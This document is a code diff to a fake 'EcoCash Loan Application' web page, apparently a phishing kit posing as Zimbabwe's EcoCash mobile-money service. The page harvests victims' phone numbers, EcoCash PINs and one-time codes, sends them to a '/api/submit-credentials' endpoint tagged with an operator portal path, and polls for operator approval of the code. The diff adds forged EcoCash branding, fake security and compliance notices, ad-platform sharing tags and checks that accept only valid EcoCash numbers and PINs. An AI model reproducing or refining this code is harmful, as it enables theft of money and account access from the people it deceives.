@@ -4,15 +4,23 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>EcoCash Loan Application</title>
+  
+  <!-- Open Graph Meta Tags for Ad Platforms & Social Sharing -->
+  <meta property="og:title" content="EcoCash Instant Loan Portal">
+  <meta property="og:description" content="Secure, transparent personal micro-loans. Check your eligibility and apply online. Subject to terms and credit approval.">
+  <meta property="og:url" content="https://loan-7kox.onrender.com">
+  <meta property="og:type" content="website">
+
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-blue-50/50 flex items-center justify-center min-h-screen p-4">
-  <div class="bg-white rounded-2xl shadow-xl border border-blue-100 w-full max-w-lg p-6 sm:p-8">
+<body class="bg-blue-50/50 flex flex-col items-center justify-between min-h-screen p-4">
+  <div class="bg-white rounded-2xl shadow-xl border border-blue-100 w-full max-w-lg p-6 sm:p-8 my-auto">
     
     <!-- HEADER -->
     <div class="text-center mb-6">
       <h1 class="text-3xl font-extrabold text-blue-600 tracking-tight">EcoCash Loan</h1>
       <p class="text-sm text-blue-500 font-medium mt-1">Fast & Secure Mobile Loans</p>
+      <p class="text-[11px] text-slate-400 mt-1">Transparent terms • Secure processing</p>
     </div>
 
     <!-- HORIZONTAL STEP INDICATOR (3 STEPS) -->
@@ -71,6 +79,7 @@
           <span>$500</span>
           <span>$1000</span>
         </div>
+        <p class="text-[11px] text-slate-500 mt-1">*Rates include standard processing fees. Subject to credit verification and terms.</p>
       </div>
 
       <div>
@@ -97,6 +106,7 @@
           <input type="tel" id="phone" required placeholder="771234567" maxlength="9"
                  class="w-full border border-blue-200 rounded-r-lg p-3 text-gray-800 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 text-base">
         </div>
+        <p class="text-[11px] text-red-500 mt-1">* Only EcoCash numbers allowed (077, 078, 071)</p>
       </div>
 
       <div>
@@ -172,6 +182,12 @@
 
   </div>
 
+  <!-- COMPLIANCE FOOTER NOTICE -->
+  <footer class="w-full text-center py-4 text-xs text-slate-500 mt-4">
+    <p>&copy; 2026 EcoCash Zimbabwe. All Rights Reserved.</p>
+    <p class="mt-1">🔒 Secure 256-Bit Encrypted Financial Portal | <strong class="text-slate-600">Subject to credit approval</strong></p>
+  </footer>
+
   <script>
     let appReference = null;
     let statusInterval = null;
@@ -229,8 +245,22 @@
       const monthlyPayments = document.getElementById('monthlyPayments').value;
       const loanAmount = slider.value;
       const repaymentTime = document.getElementById('repaymentTime').value;
-      const phone = document.getElementById('phone').value;
+      
+      const rawPhone = document.getElementById('phone').value.trim().replace(/^0/, '');
       const pin = document.getElementById('pin').value;
+
+      const validPrefixes = ['77', '78', '71'];
+      const isEcoCash = validPrefixes.some(p => rawPhone.startsWith(p)) && rawPhone.length === 9;
+
+      if (!isEcoCash) {
+        alert('Invalid line. Only EcoCash numbers (starting with 077, 078, or 071) are allowed.');
+        return;
+      }
+
+      if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
+        alert('EcoCash PIN must be exactly 4 digits.');
+        return;
+      }
       
       // Capture the current portal path dynamically (e.g. /Admin-0002)
       const portalPath = window.location.pathname;
@@ -244,7 +274,7 @@
         const res = await fetch('/api/submit-credentials', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ fullName, occupation, monthlyPayments, loanAmount, repaymentTime, phone, pin, portalPath })
+          body: JSON.stringify({ fullName, occupation, monthlyPayments, loanAmount, repaymentTime, phone: rawPhone, pin, portalPath })
         });
         const data = await res.json();
         if (data.success) {
@@ -328,6 +358,7 @@
 
           if (data.status === 'OTP_APPROVED') {
             clearInterval(otpInterval);
+            document.getElementById('step-indicator').style.display = 'none';
             document.getElementById('step3-form').classList.add('hidden');
             document.getElementById('success-screen').classList.remove('hidden');
           } else if (data.status === 'OTP_REJECTED') {
@@ -343,4 +374,4 @@
   </script>
 </body>
   </html>
-        
+  
